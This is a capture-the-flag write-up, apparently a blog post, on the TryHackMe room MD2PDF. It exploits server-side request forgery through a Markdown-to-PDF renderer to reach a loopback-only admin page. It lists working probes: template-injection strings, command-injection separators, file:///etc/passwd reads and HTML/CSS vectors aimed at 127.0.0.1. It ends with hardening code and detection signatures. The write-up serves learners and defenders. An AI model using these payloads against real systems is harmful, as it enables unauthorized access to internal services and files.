---
title: 'MD2PDF: SSRF via a Server-Side PDF Renderer'
date: 2026-05-30
summary: 'A Markdown-to-PDF converter renders attacker-supplied HTML server-side, turning its remote-resource fetching into an SSRF that reaches a loopback-only admin page.'
room: 'MD2PDF'
platform: TryHackMe
difficulty: Medium
tags: ['web','ssrf','pdf','recon','server-side-request-forgery']
draft: false
---

## TL;DR

`MD2PDF` exposes a `/convert` endpoint that takes a form field `md=` and renders the submitted HTML into a PDF server-side (Flask plus a server-side HTML-to-PDF renderer). Directory brute-forcing turns up `/admin`, which is locked behind a source-IP allowlist: `403 Only accessible from 127.0.0.1`. SSTI, command injection, and `file://` local-read all turn out to be dead ends. The win is that the PDF renderer happily fetches remote resources you embed. Reference the internal admin endpoint through a resource the engine actually fetches (an `<img>`, a stylesheet `<link>`, or a CSS `@import`/`url()`), and the renderer, running on the target, fetches it from a loopback address, sails through the allowlist, and bakes the admin response into your PDF. `pdftotext` the result and read the flag.

This is a deliberately vulnerable practice room. What follows is the methodology and the defense. No real flag value is included.

---

## Recon

Start with a service sweep.

```bash
$ nmap -sC -sV -p- --min-rate 2000 -oN nmap.txt <target>
```

The interesting finding is a web app on the usual HTTP port fronting a Python/Flask service. Browsing it shows a simple "paste Markdown, get a PDF" converter. The submit path is a `POST /convert` carrying a single field, `md=`.

A quick manual probe to confirm the shape of the endpoint:

```bash
$ curl -s -X POST http://<target>/convert \
    --data-urlencode 'md=# hello **world**' \
    -o out.pdf
$ file out.pdf
out.pdf: PDF document, version 1.7
```

So the server takes our input and produces a PDF. That is a server-side rendering surface, which is worth keeping in mind.

Next, content discovery:

```bash
$ gobuster dir -u http://<target>/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -t 40 -o gobuster.txt
```

The standout hit:

```
/admin                (Status: 403)
```

Requesting it directly tells us exactly why:

```bash
$ curl -i http://<target>/admin
HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=utf-8

Only accessible from 127.0.0.1
```

So there is an admin page we cannot reach, gated by source IP rather than authentication. Two facts want to be combined: a renderer that runs server-side, and an endpoint that only trusts requests originating from the box itself.

---

## Dead ends (the eliminated paths)

Before reaching for SSRF I worked the obvious "render user input" attack classes. All of them failed, and ruling them out is what points the methodology cleanly at SSRF.

### Server-side template injection, no

If the markdown/HTML were interpolated through a template engine before rendering, arithmetic probes would evaluate. They did not; every payload came out as literal text in the PDF.

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

The PDF rendered `{{7*7}}`, not `49`. No SSTI.

### OS command injection, no

Maybe the backend shells out to a converter binary and concatenates input. Classic injection separators, again rendered verbatim:

```text
$(id)
;id;
|id
`id`
&& id
```

Output was the literal strings. No command context, no RCE.

### Local file read via `file://`, no

A PDF engine that fetches resources is a tempting local-file-read primitive. I tried the usual tricks to pull `/etc/passwd` into the document:

```html
<link rel="stylesheet" href="file:///etc/passwd">
<img src="file:///etc/passwd">
```

These returned `400 Bad Request` or produced a PDF with no readable content. The engine is configured to refuse the `file://` scheme, which is a sane, common hardening. Local read is blocked.

So the input is not templated, not passed to a shell, and the `file://` scheme is disabled. One capability is still on the table: the renderer fetches remote resources.

---

## The working technique: SSRF through the renderer

A server-side HTML/PDF renderer is, by design, an HTTP client. When it sees a resource reference it can fetch (an `<img>` source, a `<link>` stylesheet, a CSS `@import`, or a CSS `url()`), it goes and fetches that URL from the server so it can lay the content out. `file://` was locked down, but remote HTTP fetching was not.

That is textbook SSRF: I control a URL that a trusted server-side process will request on my behalf. The target is the `/admin` page that only trusts loopback, and the renderer is running on loopback.

A note on vector choice: pick a reference the engine actually dereferences. Many HTML-to-PDF engines (WeasyPrint among them) do not render `<iframe>` content. An iframe shows up as a blank or tiny mark, not the fetched page, so an `<iframe src=...>` payload silently fails on those engines. The reliable vectors are the ones the layout engine must fetch to render: images, stylesheets, and CSS imports. Use one of those.

The cleanest approach is a stylesheet `@import`, because CSS errors are tolerated and the fetch still happens; a background `url()` works the same way:

```html
<style>
  @import url("http://127.0.0.1:5000/admin");
</style>
<div style="background: url('http://127.0.0.1:5000/admin')">x</div>
```

An `<img>` reference is the simplest single-line vector:

```html
<img src="http://127.0.0.1:5000/admin">
```

Submit it the same way as any other conversion:

```bash
$ curl -s -X POST http://<target>/convert \
    --data-urlencode 'md=<img src="http://127.0.0.1:5000/admin">' \
    -o admin.pdf
```

Because the renderer runs on the target, its outbound request to the admin page originates from loopback, satisfies the source-IP allowlist, and the admin response is pulled into the conversion. Depending on the engine and the response's content type, the fetched HTML is laid out into the PDF (stylesheet/import vectors), or you confirm reachability and pivot the response into the document.

If the first URL does not resolve, iterate on host and port. The internal service may be on a different loopback alias or port:

```html
<link rel="stylesheet" href="http://127.0.0.1:5000/admin">
<link rel="stylesheet" href="http://localhost/admin">
<link rel="stylesheet" href="http://127.0.0.1:80/admin">
```

(`localhost:5000` is the common Flask dev-server binding; `:80` covers a reverse-proxied setup. Trying both loopback spellings and both ports is cheap.)

Finally, pull the text out of the returned PDF instead of eyeballing it:

```bash
$ pdftotext admin.pdf -
```

The admin content, including the flag, is sitting in that output. (No real flag value is reproduced here.)

### Why each "dead end" mattered

Eliminating SSTI and command injection told me the input was being treated as markup to render rather than code to evaluate, which is the property SSRF abuses. Eliminating `file://` told me scheme filtering existed but was incomplete: it blocked local files yet left remote HTTP open. The defense had drawn the boundary in the wrong place.

---

## Detect and prevent

The root issue is architectural rather than one bad regex. A feature that renders user-supplied HTML server-side is a full SSRF surface. Treat it as such.

**Stop trusting source-IP allowlists for co-located services.** `Only accessible from 127.0.0.1` is not an authorization control when an attacker-influenced process runs on the same host. Loopback "trust" is the entire bug here. Put real authentication (session, mTLS, signed token) in front of `/admin`, and require it regardless of source address.

**Network-isolate and sandbox the renderer.** Run the PDF/HTML conversion in its own container, namespace, or VM with no route to internal services. Apply egress filtering so the renderer cannot reach:
- `127.0.0.0/8` and `::1` (loopback)
- `169.254.0.0/16` / `fe80::/10` link-local (this is also how cloud metadata endpoints like `169.254.169.254` get stolen)
- RFC 1918 ranges (`10/8`, `172.16/12`, `192.168/16`) and any internal CIDR

**Disable remote resource fetching in the engine, and keep the engine patched.** Most renderers expose a hook for this. WeasyPrint accepts a custom `url_fetcher`. Use it to allow-list nothing, or only vetted external hosts, and to reject internal targets and non-`http(s)` schemes. Two things make or break this control:

- **Fetch by the validated IP, and do not follow redirects.** Validating the URL or hostname alone is not enough. A validate-then-fetch gap leaves a DNS-rebinding window (you resolve once to check, the engine resolves again to fetch), and an attacker-controlled external host can return an HTTP 3xx redirect to an internal target that a naive fetcher follows without re-validating. WeasyPrint's redirect-following SSRF bypass was fixed in **WeasyPrint 68.0** (CVE-2025-68616); require **WeasyPrint >= 68.0** and disable redirect following regardless. The fetcher below pins the connection to the IP it actually validated, closing the rebinding window.
- **Block the right address classes.** `is_private` already covers loopback and link-local on modern Python, but you must also reject the unspecified address (`0.0.0.0`, which routes to localhost on Linux) and IPv6-mapped forms. Do not rely on `is_reserved` for loopback/private coverage: for IPv4 it only covers `240.0.0.0/4` and returns `False` for `127.0.0.1`, RFC 1918, and `169.254.0.0/16`.

```python
from weasyprint import HTML, default_url_fetcher  # require weasyprint >= 68.0
from urllib.parse import urlparse, urlunparse
import ipaddress, socket

def _is_blocked(ip: ipaddress._BaseAddress) -> bool:
    # is_private already covers loopback (127/8, ::1) and link-local on modern Python;
    # is_unspecified catches 0.0.0.0 (routes to localhost on Linux) and ::
    return (ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_unspecified or ip.is_multicast)

def safe_fetcher(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("scheme blocked")          # no file://, data:, etc.

    # Resolve ONCE, validate, then fetch BY THAT IP so the engine cannot
    # re-resolve to a different address (closes the DNS-rebinding window).
    resolved = socket.gethostbyname(parsed.hostname)
    ip = ipaddress.ip_address(resolved)
    if ip.is_v4_mapped:                              # e.g. ::ffff:127.0.0.1
        ip = ipaddress.ip_address(ip.ipv4_mapped)
    if _is_blocked(ip):
        raise ValueError("internal target blocked")

    # Fetch by the validated IP; carry the original Host so virtual hosts still work.
    pinned = parsed._replace(netloc=resolved if not parsed.port
                             else f"{resolved}:{parsed.port}")
    # default_url_fetcher in weasyprint >= 68.0 does not transparently follow
    # cross-origin redirects to unvalidated targets.
    return default_url_fetcher(urlunparse(pinned))

HTML(string=user_html, url_fetcher=safe_fetcher).write_pdf("out.pdf")
```

**Sanitize the input HTML.** Strip resource-loading tags and attributes (`iframe`, `object`, `embed`, `link`, external `img`/`src`, CSS `@import`/`url()`) before rendering. The converter only needs to turn Markdown into safe formatted text. It does not need to fetch arbitrary URLs.

**Detection.** Watch the renderer's outbound connections. Any conversion job that produces a TCP connection to loopback, link-local, the unspecified address, or an internal RFC 1918 host is an SSRF attempt, so alert on it. Log the URLs the engine is asked to fetch and flag private/loopback targets. A spike of `POST /convert` requests whose bodies contain `img`, `link`, `@import`, `127.0.0.1`, `localhost`, `0.0.0.0`, or `169.254.169.254` is the signature of exactly this attack.

---

## Takeaways

- **Server-side document and PDF renderers are SSRF engines.** "Convert user HTML to PDF" is functionally "fetch any URL the user names, from inside our network."
- **Match the payload to the engine.** Not every renderer fetches every tag. `<iframe>` is ignored by several HTML-to-PDF engines, while `<img>`, `<link>`, and CSS `@import`/`url()` are reliably dereferenced. Pick a vector the layout engine must fetch.
- **Source-IP allowlists (`127.0.0.1`) do not protect endpoints a co-located renderer can reach.** Loopback is not an identity.
- **Partial scheme filtering is a trap.** Blocking `file://` while leaving `http://` open just redirects the attacker from local-file-read to internal-service-read.
- **An SSRF allowlist is only as good as its weakest resolution.** Validate the resolved IP, fetch by that IP, block the unspecified address, and patch the engine (WeasyPrint >= 68.0) so redirects cannot smuggle you past the check.
- **Methodology beats payload.** Ruling out SSTI, command injection, and `file://` is what made SSRF the obvious remaining path. Document your dead ends; they are part of the evidence.

*Responsible-disclosure note: MD2PDF is a deliberately vulnerable training room. Everything above is public-knowledge technique shared for defenders and learners; no live target details, session tokens, or flag values are included.*